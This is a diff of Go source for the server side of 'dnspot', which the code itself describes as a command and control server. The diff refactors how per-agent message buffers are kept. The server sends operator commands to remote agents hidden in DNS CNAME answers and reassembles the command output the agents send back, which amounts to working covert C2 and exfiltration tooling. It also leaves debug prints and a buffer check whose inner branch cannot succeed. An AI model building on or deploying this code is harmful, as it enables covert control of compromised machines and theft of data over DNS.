@@ -16,6 +16,7 @@ import (
 	"github.com/mosajjal/dnspot/cryptography"
 )
 
+// Server contains all the runtime configuration of a dnspot Command and Control server
 type Server struct {
 	PrivateKeyBase36         string
 	privateKey               *cryptography.PrivateKey
@@ -30,8 +31,7 @@ type Server struct {
 	// dedupPrevMsgHash is only for consecutive message duplicates
 	dedupPrevMsgHash uint64
 	// outBuffer is a buffer for outgoing messages
-	outBuffer                        map[cryptography.PublicKeyStr]map[ParentPartID][]string
-	serverPacketBuffersWithSignature map[ParentPartID][]c2.MessagePacketWithSignature
+	// outBuffer map[cryptography.PublicKeyStr]map[ParentPartID][]string
 }
 
 // log levels
@@ -43,12 +43,14 @@ const (
 	FATAL
 )
 
+// InMsg is a message coming from the frontend
 type InMsg struct {
 	Prompt string
 	Agent  string
 }
 
-// IO provides a common interface to work with dnspot
+// IO provides a common interface to work with dnspot. Any CLI/Web/WASM app can deploy the 4 functions and act as a frontend
+// for dnspot server
 type IO interface {
 	Logger(level uint8, format string, args ...interface{})
 	GetInputFeed() chan InMsg
@@ -62,18 +64,21 @@ type agentStatusForServer struct {
 	NextMessageType                 c2.MsgType
 	NextParentPartID                ParentPartID
 	HealthCheckIntervalMilliSeconds uint32
+	InBuffer                        map[ParentPartID][]c2.MessagePacketWithSignature
+	OutBuffer                       map[ParentPartID][]string
 }
 
+// ParentPartID is a unique identifier for a parent message
 type ParentPartID uint16
 
+// New returns a new Server object
 func New() Server {
 	s := Server{}
 	s.connectedAgents = make(map[cryptography.PublicKeyStr]agentStatusForServer)
-	s.outBuffer = make(map[cryptography.PublicKeyStr]map[ParentPartID][]string)
-	s.serverPacketBuffersWithSignature = make(map[ParentPartID][]c2.MessagePacketWithSignature)
 	return s
 }
 
+// ListAgents returns a list of agents connected to the server
 func (s Server) ListAgents() []string {
 	// return a deduplicated list of agents
 	agents := make([]string, 0)
@@ -91,16 +96,19 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 	agent, ok := s.connectedAgents[Packet.Signature.String()]
 	if !ok {
 		s.io.Logger(INFO, "Registering new agent in our Connected Agent List, %d agent(s) are connected", len(s.connectedAgents)+1)
-
-		// UiAgentList.AddItem(Packet.Signature.String(), "", rune(len(s.connectedAgents)+65), nil)
 		s.connectedAgents[Packet.Signature.String()] = agentStatusForServer{
 			NextMessageType:                 c2.MessageHealthcheck,
 			HealthCheckIntervalMilliSeconds: 10000, //todo: make this configurable
+			InBuffer:                        make(map[ParentPartID][]c2.MessagePacketWithSignature),
 		}
 	}
 	// agent already exists, only update the timestamps and prepare the next packet based on message type
 	agent.LastAckFromAgentPacketTime = Packet.Msg.TimeStamp
 	agent.LastAckFromAgentServerTime = uint32(time.Now().Unix())
+	// create the incoming buffer if it doesn't exist
+	if agent.InBuffer == nil {
+		agent.InBuffer = make(map[ParentPartID][]c2.MessagePacketWithSignature)
+	}
 	s.connectedAgents[Packet.Signature.String()] = agent
 	switch agent.NextMessageType {
 	case c2.MessageHealthcheck: // no one else has claimed a new command for this agent, so I'm gonna go ahead and do the routine task and respond with a Pong
@@ -134,14 +142,16 @@ func (s *Server) messageHealthcheckHandler(Packet c2.MessagePacketWithSignature,
 	case c2.MessageExecuteCommand:
 		// todo: let's see if we can send two commands here, one payload and another for adjusting the interval
 		// first check to see if this is a residual packet from a previous multi-part convo
-		if len(s.outBuffer[Packet.Signature.String()][agent.NextParentPartID]) == 0 {
+		if len(agent.OutBuffer[agent.NextParentPartID]) == 0 {
 			return nil
-
 		}
-		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, s.outBuffer[Packet.Signature.String()][agent.NextParentPartID][0])) //todo:fix the 0 index
+
+		// the last 0 in the index means that in response to any healthcheck, we will start with the first packet of the new conversation
+		// the rest should be handled by a response to this particular CNAME, hence not being part of a healtcheck response
+		cnameQ := fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][0])
+		cname, err := dns.NewRR(cnameQ)
 		if err != nil {
 			s.io.Logger(WARN, "%s", err)
-
 		}
 		q.Answer = append(q.Answer, cname)
 	}
@@ -163,13 +173,13 @@ func (s *Server) displayCommandResult(fullPayload []byte, signature *cryptograph
 	s.io.GetOutputFeed() <- fmt.Sprintf("[%s]: %s", signature.String(), out)
 }
 
-func (s *Server) HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
-	_, ok := s.connectedAgents[Packet.Signature.String()]
+func (s *Server) handleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.Msg) error {
+	agent, ok := s.connectedAgents[Packet.Signature.String()]
 	if !ok {
 		s.io.Logger(ERR, "agent not recognized")
 	}
 	// handle multipart incoming
-	s.serverPacketBuffersWithSignature[ParentPartID(Packet.Msg.ParentPartID)] = append(s.serverPacketBuffersWithSignature[ParentPartID(Packet.Msg.ParentPartID)], Packet)
+	agent.InBuffer[ParentPartID(Packet.Msg.ParentPartID)] = append(agent.InBuffer[ParentPartID(Packet.Msg.ParentPartID)], Packet)
 	// if Packet.Msg.ParentPartID != 0 { // multi part
 	//fist and middle packets
 	msg := c2.MessagePacket{
@@ -181,7 +191,6 @@ func (s *Server) HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 	payload := []byte("Ack!")
 	if Packet.Msg.IsLastPart || (Packet.Msg.ParentPartID == 0) {
 		msg.IsLastPart = true
-		agent := s.connectedAgents[Packet.Signature.String()]
 		agent.NextMessageType = c2.MessageHealthcheck
 		s.connectedAgents[Packet.Signature.String()] = agent
 		payload = []byte("Ack! Last Part")
@@ -196,23 +205,30 @@ func (s *Server) HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignatu
 		}
 		q.Answer = append(q.Answer, cname)
 	}
+
+	// we're not in the last message, and the parentID is not 0, so this is a multi-part
+	// message and we're in the middle of it, there's no payload yet. we need to send an ack
+	// as we done above, and wait for the next packet to come in and add it to the buffer
 	if !Packet.Msg.IsLastPart && !(Packet.Msg.ParentPartID == 0) {
 		return nil
 	}
-	// }
 
 	fullPayload := make([]byte, 0)
-	packets := c2.CheckMessageIntegrity(s.serverPacketBuffersWithSignature[ParentPartID(Packet.Msg.ParentPartID)])
+	packets := c2.CheckMessageIntegrity(agent.InBuffer[ParentPartID(Packet.Msg.ParentPartID)])
 	for _, packet := range packets {
 		packetPayload := packet.Msg.Payload[:]
 		fullPayload = append(fullPayload, packetPayload...)
 	}
-	// todo: clean the memory for this parentpartID
-	// delete(s.serverPacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
-	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
-	s.displayCommandResult(fullPayload, Packet.Signature)
+	// TODO: how do we acknowledge that we're done here and we both go back to healthcheck?
 	// remove the buffer from memory
-	delete(s.serverPacketBuffersWithSignature, ParentPartID(Packet.Msg.ParentPartID))
+	s.displayCommandResult(fullPayload, Packet.Signature)
+
+	s.io.Logger(DEBUG, "cleaning up buffer for %s", Packet.Signature.String())
+	// delete(agent.IncomingMessageBuffer, ParentPartID(Packet.Msg.ParentPartID))
+	delete(agent.OutBuffer, ParentPartID(Packet.Msg.ParentPartID))
+	// sometimes the multipart messages also have a message with parent ID 0, which needs to be cleaned up
+	delete(agent.OutBuffer, ParentPartID(0))
+
 	return nil
 }
 
@@ -223,30 +239,30 @@ func (s *Server) mustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptog
 	//todo: what are we getting from the client? let's decrypt and log those
 
 	parentPartID := ParentPartID(parentPartIDInt)
+	agent := s.connectedAgents[agentPublicKey.String()]
+
+	fmt.Printf("parentPartID: %d\n", parentPartID)
+	fmt.Printf("agent.OutBuffer: %#v\n", agent.OutBuffer) //TODO:remove
 
 	// check to see if the parent key exists first in case an agent disappears
-	if _, ok := s.outBuffer[agentPublicKey.String()]; !ok {
-		if targetBuffer, ok := s.outBuffer[agentPublicKey.String()][parentPartID]; ok {
+	if _, ok := agent.OutBuffer[parentPartID]; !ok {
+		if targetBuffer, ok := agent.OutBuffer[parentPartID]; ok {
 			if parentPartID == 0 {
-				// if there was a single packet living in the cache before, delete it before proceed
-				// todo: maybe this is the place for this but I think it's better to be cleaned up elsewhere
-				// delete(s.outBuffer[agentPublicKey.String()] , parentPartId)
-				s.outBuffer[agentPublicKey.String()] = make(map[ParentPartID][]string)
-				s.outBuffer[agentPublicKey.String()][parentPartID] = append(s.outBuffer[agentPublicKey.String()][parentPartID], Answers[0])
+				s.io.Logger(INFO, "key and ParentPartId already exist in the buffer, overwriting...")
+				agent.OutBuffer = make(map[ParentPartID][]string)
+				agent.OutBuffer[parentPartID] = append(agent.OutBuffer[parentPartID], Answers[0])
 			}
-			s.io.Logger(INFO, "key and ParentPartId already exist in the buffer, overwriting...")
 
 		} else {
 			//initialize the map
-			s.outBuffer[agentPublicKey.String()] = make(map[ParentPartID][]string)
+			agent.OutBuffer = make(map[ParentPartID][]string)
 			targetBuffer = append(targetBuffer, Answers...)
-			s.outBuffer[agentPublicKey.String()][parentPartID] = targetBuffer
+			agent.OutBuffer[parentPartID] = targetBuffer
 		}
 	}
 	s.io.Logger(INFO, "command was successfully added to outgoing buffer to be sent")
 
 	// set NextMessageType to let the healthcheck responder know
-	agent := s.connectedAgents[agentPublicKey.String()]
 	agent.NextMessageType = msgPacket.MessageType
 	agent.NextParentPartID = parentPartID
 	s.connectedAgents[agentPublicKey.String()] = agent
@@ -280,16 +296,16 @@ func (s *Server) messageChatHandler(Packet c2.MessagePacketWithSignature, q *dns
 	agent := s.connectedAgents[Packet.Signature.String()]
 	acknowledgedID := Packet.Msg.PartID
 	// handle last packet ID
-	if uint16(len(s.outBuffer[Packet.Signature.String()][agent.NextParentPartID])) == acknowledgedID {
+	if uint16(len(agent.OutBuffer[agent.NextParentPartID])) == acknowledgedID {
 		return nil
 	}
 	if Packet.Msg.IsLastPart || Packet.Msg.ParentPartID == 0 {
 		// reset the agent status to healthcheck and clean the buffer
 		agent.NextMessageType = c2.MessageHealthcheck
-		delete(s.outBuffer[Packet.Signature.String()], agent.NextParentPartID)
+		delete(agent.OutBuffer, agent.NextParentPartID)
 		return nil
 	}
-	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, s.outBuffer[Packet.Signature.String()][agent.NextParentPartID][acknowledgedID+1]))
+	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1]))
 	if err != nil {
 		s.io.Logger(WARN, "%s", err)
 	}
@@ -336,16 +352,16 @@ func (s *Server) handleRunCommandAckFromAgent(Packet c2.MessagePacketWithSignatu
 	agent := s.connectedAgents[Packet.Signature.String()]
 	acknowledgedID := Packet.Msg.PartID
 	// handle last packet ID
-	if uint16(len(s.outBuffer[Packet.Signature.String()][agent.NextParentPartID])) == acknowledgedID {
+	if uint16(len(agent.OutBuffer[agent.NextParentPartID])) == acknowledgedID {
 		return nil
 	}
 	if Packet.Msg.IsLastPart {
 		// reset the agent status to healthcheck and clean the buffer
 		agent.NextMessageType = c2.MessageHealthcheck
-		delete(s.outBuffer[Packet.Signature.String()], agent.NextParentPartID)
+		delete(agent.OutBuffer, agent.NextParentPartID)
 		return nil
 	}
-	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, s.outBuffer[Packet.Signature.String()][agent.NextParentPartID][acknowledgedID+1]))
+	cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, agent.OutBuffer[agent.NextParentPartID][acknowledgedID+1]))
 	if err != nil {
 		s.io.Logger(WARN, "%s", err)
 	}
@@ -392,7 +408,7 @@ func (s *Server) parseQuery(m *dns.Msg) error {
 			case c2.MessageExecuteCommand:
 				return s.handleRunCommandAckFromAgent(o, m)
 			case c2.MessageExecuteCommandResponse:
-				return s.HandleExecuteCommandResponse(o, m)
+				return s.handleExecuteCommandResponse(o, m)
 			case c2.MessageSetHealthInterval:
 				return nil //
 			case c2.MessageSyncTime:
@@ -481,7 +497,12 @@ func (s *Server) RunServer(serverIO IO) error {
 		case text := <-s.io.GetInputFeed():
 			if len(text.Prompt) > 0 {
 				agent, _ := cryptography.PublicKeyFromString(cryptography.PublicKeyStr(text.Agent))
-				_ = s.sendMessageToAgent(agent, text.Prompt)
+				err = s.sendMessageToAgent(agent, text.Prompt)
+				if err != nil {
+					s.io.Logger(WARN, "%s", err)
+				} else {
+					s.io.Logger(DEBUG, "Sent message to %s", text.Agent)
+				}
 			}
 		case <-s.io.GetContext().Done():
 			s.io.Logger(INFO, "Context cancelled, shutting down")
